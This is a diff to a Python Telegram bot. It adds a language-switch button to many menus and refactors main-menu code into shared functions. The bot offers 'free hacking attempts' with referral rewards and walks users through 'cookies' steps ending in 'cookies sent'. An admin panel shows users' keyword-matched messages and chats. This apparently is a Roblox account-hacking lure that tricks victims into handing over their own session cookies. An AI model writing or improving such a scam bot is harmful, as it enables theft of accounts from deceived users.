@@ -37,6 +37,7 @@ TRANSLATIONS = {
         # Выбор языка
         "choose_language": "🌐 **Выберите язык для использования бота:**\n\nВыберите язык, на котором вы хотите общаться с ботом.",
         "language_changed": "✅ Язык изменен на Русский!",
+        "change_language": "🌐 Сменить язык",
         
         # Главное меню
         "bot_start": "Привет, {name}! 👋\n\n🎯 **У тебя {attempts} бесплатная попытка взлома**\n👥 Приглашено друзей: {referrals}\n🔑 За каждого друга +1 попытка\n\nВыбери нужную категорию:",
@@ -148,6 +149,7 @@ TRANSLATIONS = {
         # Выбор языка
         "choose_language": "🌐 **Choose your language:**\n\nSelect the language you want to use the bot in.",
         "language_changed": "✅ Language changed to English!",
+        "change_language": "🌐 Change language",
         
         # Главное меню
         "bot_start": "Hello, {name}! 👋\n\n🎯 **You have {attempts} free hacking attempts**\n👥 Friends invited: {referrals}\n🔑 +1 attempt for each friend\n\nChoose a category:",
@@ -881,7 +883,6 @@ async def language_selection(update: Update, context: ContextTypes.DEFAULT_TYPE)
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    # Показываем выбор языка на двух языках
     await update.message.reply_text(
         "🌐 **Выберите язык / Choose language:**\n\n"
         "🇷🇺 Русский\n"
@@ -902,9 +903,18 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Проверяем, есть ли у пользователя выбранный язык
     if not os.path.exists(LANGUAGE_FILE) or str(user_id) not in json.load(open(LANGUAGE_FILE, "r", encoding="utf-8")) if os.path.exists(LANGUAGE_FILE) else True:
-        # Если язык не выбран - показываем выбор языка
         await language_selection(update, context)
         return
+    
+    await show_main_menu(update, context)
+
+# ===================================================
+# ФУНКЦИЯ ПОКАЗА ГЛАВНОГО МЕНЮ
+# ===================================================
+
+async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    user_id = user.id
     
     # Проверяем подписку для обычных пользователей
     if user_id != YOUR_USER_ID:
@@ -923,29 +933,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
     
     user_name = user.first_name
-    
-    referrer_id = None
-    if context.args and context.args[0].startswith('ref_'):
-        try:
-            referrer_id = int(context.args[0].replace('ref_', ''))
-            if referrer_id == user_id:
-                referrer_id = None
-        except:
-            referrer_id = None
-    
-    all_users = get_all_users()
-    is_new_user = str(user_id) not in all_users
-    
-    save_all_user(
-        user_id=user.id,
-        username=user.username or "no_username",
-        first_name=user.first_name or "Unknown",
-        referrer_id=referrer_id
-    )
-    
-    if is_new_user:
-        set_user_attempts(user_id, 1)
-    
     attempts = get_user_attempts(user_id)
     referrals = get_referral_count(user_id)
     
@@ -957,6 +944,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [
             InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral"),
             InlineKeyboardButton(get_text(user_id, "buy_roblox"), callback_data="buy_roblox"),
+        ],
+        [
+            InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language"),
         ]
     ]
     
@@ -978,10 +968,17 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ])
     
     reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text(
-        get_text(user_id, "bot_start", name=user_name, attempts=attempts, referrals=referrals),
-        reply_markup=reply_markup
-    )
+    
+    if hasattr(update, 'callback_query') and update.callback_query:
+        await update.callback_query.edit_message_text(
+            get_text(user_id, "bot_start", name=user_name, attempts=attempts, referrals=referrals),
+            reply_markup=reply_markup
+        )
+    elif hasattr(update, 'message'):
+        await update.message.reply_text(
+            get_text(user_id, "bot_start", name=user_name, attempts=attempts, referrals=referrals),
+            reply_markup=reply_markup
+        )
 
 # ===================================================
 # ОБРАБОТЧИК НАЖАТИЙ НА КНОПКИ
@@ -1003,7 +1000,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if lang == "ru":
             await query.edit_message_text(get_text(user_id, "language_changed"))
         else:
-            await query.edit_message_text(get_text(user_id, "language_changed_en"))
+            await query.edit_message_text("✅ Language changed to English!")
         
         # Показываем главное меню после выбора языка
         user_name = update.effective_user.first_name
@@ -1024,92 +1021,29 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
                 return
         
-        attempts = get_user_attempts(user_id)
-        referrals = get_referral_count(user_id)
-        
+        await show_main_menu_by_query(query, context, user_id)
+        return
+    
+    # --- СМЕНА ЯЗЫКА (НОВАЯ КНОПКА) ---
+    if data == "change_language":
         keyboard = [
-            [
-                InlineKeyboardButton(get_text(user_id, "device"), callback_data="device"),
-                InlineKeyboardButton(get_text(user_id, "cookies"), callback_data="cookies"),
-            ],
-            [
-                InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral"),
-                InlineKeyboardButton(get_text(user_id, "buy_roblox"), callback_data="buy_roblox"),
-            ]
+            [InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru")],
+            [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
+            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
         ]
-        
-        if user_id == YOUR_USER_ID:
-            keyboard.append([
-                InlineKeyboardButton(get_text(user_id, "all_users"), callback_data="view_all_users"),
-                InlineKeyboardButton(get_text(user_id, "keyword_users"), callback_data="view_keyword_users_only"),
-            ])
-            keyboard.append([
-                InlineKeyboardButton(get_text(user_id, "stats"), callback_data="view_stats"),
-                InlineKeyboardButton(get_text(user_id, "chat_user"), callback_data="select_user_for_chat"),
-            ])
-            keyboard.append([
-                InlineKeyboardButton(get_text(user_id, "give_attempts"), callback_data="give_attempts_menu"),
-                InlineKeyboardButton(get_text(user_id, "mailing"), callback_data="send_mailing"),
-            ])
-            keyboard.append([
-                InlineKeyboardButton(get_text(user_id, "delete_users"), callback_data="delete_users_menu"),
-            ])
-        
         reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        try:
-            await query.edit_message_text(
-                get_text(user_id, "bot_start", name=user_name, attempts=attempts, referrals=referrals),
-                reply_markup=reply_markup
-            )
-        except:
-            await query.message.reply_text(
-                get_text(user_id, "bot_start", name=user_name, attempts=attempts, referrals=referrals),
-                reply_markup=reply_markup
-            )
+        await query.edit_message_text(
+            get_text(user_id, "choose_language"),
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
         return
     
     # --- ПРОВЕРКА ПОДПИСКИ ---
     if data == "check_subscription":
         is_subscribed = await check_subscription(user_id, context)
         if is_subscribed:
-            user_name = update.effective_user.first_name
-            attempts = get_user_attempts(user_id)
-            referrals = get_referral_count(user_id)
-            
-            keyboard = [
-                [
-                    InlineKeyboardButton(get_text(user_id, "device"), callback_data="device"),
-                    InlineKeyboardButton(get_text(user_id, "cookies"), callback_data="cookies"),
-                ],
-                [
-                    InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral"),
-                    InlineKeyboardButton(get_text(user_id, "buy_roblox"), callback_data="buy_roblox"),
-                ]
-            ]
-            
-            if user_id == YOUR_USER_ID:
-                keyboard.append([
-                    InlineKeyboardButton(get_text(user_id, "all_users"), callback_data="view_all_users"),
-                    InlineKeyboardButton(get_text(user_id, "keyword_users"), callback_data="view_keyword_users_only"),
-                ])
-                keyboard.append([
-                    InlineKeyboardButton(get_text(user_id, "stats"), callback_data="view_stats"),
-                    InlineKeyboardButton(get_text(user_id, "chat_user"), callback_data="select_user_for_chat"),
-                ])
-                keyboard.append([
-                    InlineKeyboardButton(get_text(user_id, "give_attempts"), callback_data="give_attempts_menu"),
-                    InlineKeyboardButton(get_text(user_id, "mailing"), callback_data="send_mailing"),
-                ])
-                keyboard.append([
-                    InlineKeyboardButton(get_text(user_id, "delete_users"), callback_data="delete_users_menu"),
-                ])
-            
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            await query.edit_message_text(
-                get_text(user_id, "bot_start", name=user_name, attempts=attempts, referrals=referrals),
-                reply_markup=reply_markup
-            )
+            await show_main_menu_by_query(query, context, user_id)
         else:
             keyboard = [
                 [InlineKeyboardButton(get_text(user_id, "subscribe_button"), url="https://t.me/reviewsh1pe")],
@@ -1126,6 +1060,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # --- ПОКУПКА ROBLOX ---
     if data == "buy_roblox":
         keyboard = [
+            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
             [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1145,6 +1080,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         referral_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
         
         keyboard = [
+            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
             [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1178,6 +1114,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if attempts <= 0:
             keyboard = [
                 [InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral")],
+                [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
                 [InlineKeyboardButton(get_text(user_id, "back"), callback_data="back_to_menu")]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1191,6 +1128,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [
                 InlineKeyboardButton(get_text(user_id, "phone"), callback_data="phone"),
                 InlineKeyboardButton(get_text(user_id, "computer"), callback_data="computer"),
+            ],
+            [
+                InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language"),
             ],
             [
                 InlineKeyboardButton(get_text(user_id, "back"), callback_data="back_to_menu"),
@@ -1207,8 +1147,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "phone":
         keyboard = [
             [
-                InlineKeyboardButton(get_text(user_id, "back"), callback_data="back_to_menu"),
+                InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language"),
                 InlineKeyboardButton(get_text(user_id, "cookies_copied"), callback_data="cookies_copied_phone"),
+            ],
+            [
+                InlineKeyboardButton(get_text(user_id, "back"), callback_data="back_to_menu"),
             ]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1223,8 +1166,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "computer":
         keyboard = [
             [
-                InlineKeyboardButton(get_text(user_id, "back"), callback_data="back_to_menu"),
+                InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language"),
                 InlineKeyboardButton(get_text(user_id, "cookies_copied"), callback_data="cookies_copied_computer"),
+            ],
+            [
+                InlineKeyboardButton(get_text(user_id, "back"), callback_data="back_to_menu"),
             ]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1237,11 +1183,22 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     elif data == "cookies_copied_phone" or data == "cookies_copied_computer":
-        await query.message.reply_text(get_text(user_id, "cookies_sent"))
+        keyboard = [
+            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
+            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.message.reply_text(
+            get_text(user_id, "cookies_sent"),
+            reply_markup=reply_markup
+        )
         return
     
     elif data == "cookies":
-        keyboard = [[InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]]
+        keyboard = [
+            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
+            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
+        ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
             get_text(user_id, "cookies_instruction"),
@@ -1250,43 +1207,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     elif data == "back_to_menu":
-        user_name = update.effective_user.first_name
-        attempts = get_user_attempts(user_id)
-        referrals = get_referral_count(user_id)
-        
-        keyboard = [
-            [
-                InlineKeyboardButton(get_text(user_id, "device"), callback_data="device"),
-                InlineKeyboardButton(get_text(user_id, "cookies"), callback_data="cookies"),
-            ],
-            [
-                InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral"),
-                InlineKeyboardButton(get_text(user_id, "buy_roblox"), callback_data="buy_roblox"),
-            ]
-        ]
-        
-        if user_id == YOUR_USER_ID:
-            keyboard.append([
-                InlineKeyboardButton(get_text(user_id, "all_users"), callback_data="view_all_users"),
-                InlineKeyboardButton(get_text(user_id, "keyword_users"), callback_data="view_keyword_users_only"),
-            ])
-            keyboard.append([
-                InlineKeyboardButton(get_text(user_id, "stats"), callback_data="view_stats"),
-                InlineKeyboardButton(get_text(user_id, "chat_user"), callback_data="select_user_for_chat"),
-            ])
-            keyboard.append([
-                InlineKeyboardButton(get_text(user_id, "give_attempts"), callback_data="give_attempts_menu"),
-                InlineKeyboardButton(get_text(user_id, "mailing"), callback_data="send_mailing"),
-            ])
-            keyboard.append([
-                InlineKeyboardButton(get_text(user_id, "delete_users"), callback_data="delete_users_menu"),
-            ])
-        
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(
-            get_text(user_id, "bot_start", name=user_name, attempts=attempts, referrals=referrals),
-            reply_markup=reply_markup
-        )
+        await show_main_menu_by_query(query, context, user_id)
         return
     
     # --- АДМИНСКИЕ КНОПКИ ---
@@ -1333,6 +1254,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("➕ +5 " + get_text(user_id, "give_attempts").replace("🎯 ", ""), callback_data=f"give_attempts_add_{target_user_id}_5")],
             [InlineKeyboardButton("➕ +10 " + get_text(user_id, "give_attempts").replace("🎯 ", ""), callback_data=f"give_attempts_add_{target_user_id}_10")],
             [InlineKeyboardButton("🔢 " + get_text(user_id, "give_more"), callback_data=f"give_attempts_input_{target_user_id}")],
+            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
             [InlineKeyboardButton(get_text(user_id, "back"), callback_data="give_attempts_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1357,6 +1279,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         keyboard = [
             [InlineKeyboardButton(get_text(user_id, "give_more"), callback_data=f"give_attempts_user_{target_user_id}")],
+            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
             [InlineKeyboardButton(get_text(user_id, "back"), callback_data="give_attempts_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1381,6 +1304,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [
             [InlineKeyboardButton(get_text(user_id, "delete_single_user"), callback_data="delete_single_user")],
             [InlineKeyboardButton(get_text(user_id, "delete_all_users"), callback_data="delete_all_users_confirm")],
+            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
             [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1403,6 +1327,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             button_text = f"🗑 {name} (@{username})"
             keyboard.append([InlineKeyboardButton(button_text, callback_data=f"confirm_delete_{user_id_str}")])
         
+        keyboard.append([InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")])
         keyboard.append([InlineKeyboardButton(get_text(user_id, "back"), callback_data="delete_users_menu")])
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
@@ -1420,6 +1345,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         keyboard = [
             [InlineKeyboardButton(get_text(user_id, "yes_delete"), callback_data=f"execute_delete_{target_user_id}")],
+            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
             [InlineKeyboardButton(get_text(user_id, "cancel"), callback_data="delete_single_user")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1449,6 +1375,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "delete_all_users_confirm":
         keyboard = [
             [InlineKeyboardButton(get_text(user_id, "confirm_delete_all"), callback_data="execute_delete_all")],
+            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
             [InlineKeyboardButton(get_text(user_id, "cancel"), callback_data="delete_users_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1475,6 +1402,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [
             [InlineKeyboardButton(get_text(user_id, "mailing_all"), callback_data="mailing_all")],
             [InlineKeyboardButton(get_text(user_id, "mailing_keyword"), callback_data="mailing_keyword")],
+            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
             [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1529,6 +1457,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         today_count = sum(1 for user_data in all_users.values() if user_data.get("first_seen", "").startswith(today))
         
         keyboard = [
+            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
             [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")],
             [InlineKeyboardButton(get_text(user_id, "all_users"), callback_data="view_all_users")]
         ]
@@ -1595,6 +1524,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [
             [InlineKeyboardButton(get_text(user_id, "keyword_only"), callback_data=f"chat_user_keyword_{target_user_id}")],
             [InlineKeyboardButton(get_text(user_id, "show_all"), callback_data=f"chat_user_full_{target_user_id}")],
+            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
             [InlineKeyboardButton(get_text(user_id, "back"), callback_data="select_user_for_chat")],
             [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
         ]
@@ -1640,6 +1570,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         keyboard = [
             [InlineKeyboardButton(get_text(user_id, "keyword_only"), callback_data=f"chat_user_keyword_{target_user_id}")],
+            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
             [InlineKeyboardButton(get_text(user_id, "back"), callback_data=f"chat_user_{target_user_id}")],
             [InlineKeyboardButton(get_text(user_id, "back"), callback_data="select_user_for_chat")],
             [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
@@ -1683,6 +1614,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         keyboard = [
             [InlineKeyboardButton(get_text(user_id, "message_received").split(".")[0], callback_data=f"chat_user_{target_user_id}")],
+            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
             [InlineKeyboardButton(get_text(user_id, "back"), callback_data="select_user_for_chat")],
             [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
         ]
@@ -1721,6 +1653,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             text += f"\n... " + get_text(user_id, "show_more", count=len(messages)-30)
         
         keyboard = [
+            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
             [InlineKeyboardButton(get_text(user_id, "back"), callback_data="view_keyword_messages")],
             [InlineKeyboardButton(get_text(user_id, "message_received").split(".")[0], callback_data=f"chat_user_{target_user_id}")]
         ]
@@ -1734,6 +1667,53 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             await query.edit_message_text(text, reply_markup=reply_markup)
         return
+
+# ===================================================
+# ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ ПОКАЗА ГЛАВНОГО МЕНЮ
+# ===================================================
+
+async def show_main_menu_by_query(query, context, user_id):
+    user = query.from_user
+    user_name = user.first_name
+    attempts = get_user_attempts(user_id)
+    referrals = get_referral_count(user_id)
+    
+    keyboard = [
+        [
+            InlineKeyboardButton(get_text(user_id, "device"), callback_data="device"),
+            InlineKeyboardButton(get_text(user_id, "cookies"), callback_data="cookies"),
+        ],
+        [
+            InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral"),
+            InlineKeyboardButton(get_text(user_id, "buy_roblox"), callback_data="buy_roblox"),
+        ],
+        [
+            InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language"),
+        ]
+    ]
+    
+    if user_id == YOUR_USER_ID:
+        keyboard.append([
+            InlineKeyboardButton(get_text(user_id, "all_users"), callback_data="view_all_users"),
+            InlineKeyboardButton(get_text(user_id, "keyword_users"), callback_data="view_keyword_users_only"),
+        ])
+        keyboard.append([
+            InlineKeyboardButton(get_text(user_id, "stats"), callback_data="view_stats"),
+            InlineKeyboardButton(get_text(user_id, "chat_user"), callback_data="select_user_for_chat"),
+        ])
+        keyboard.append([
+            InlineKeyboardButton(get_text(user_id, "give_attempts"), callback_data="give_attempts_menu"),
+            InlineKeyboardButton(get_text(user_id, "mailing"), callback_data="send_mailing"),
+        ])
+        keyboard.append([
+            InlineKeyboardButton(get_text(user_id, "delete_users"), callback_data="delete_users_menu"),
+        ])
+    
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await query.edit_message_text(
+        get_text(user_id, "bot_start", name=user_name, attempts=attempts, referrals=referrals),
+        reply_markup=reply_markup
+    )
 
 # ===================================================
 # ОБРАБОТЧИК ТЕКСТОВЫХ СООБЩЕНИЙ
@@ -1820,6 +1800,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not use_attempt(user_id):
             keyboard = [
                 [InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral")],
+                [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
                 [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1918,6 +1899,7 @@ def main():
     print("🗑 Для удаления пользователей нажми кнопку 'Удалить пользователей' в меню")
     print("🎯 Для выдачи попыток нажми кнопку 'Выдать попытки' в меню")
     print("🎯 Для выдачи попыток всем у кого 0 - кнопка 'Выдать всем у кого 0'")
+    print("🌐 Для смены языка нажмите кнопку 'Сменить язык' в главном меню")
     app.run_polling()
 
 if __name__ == "__main__":
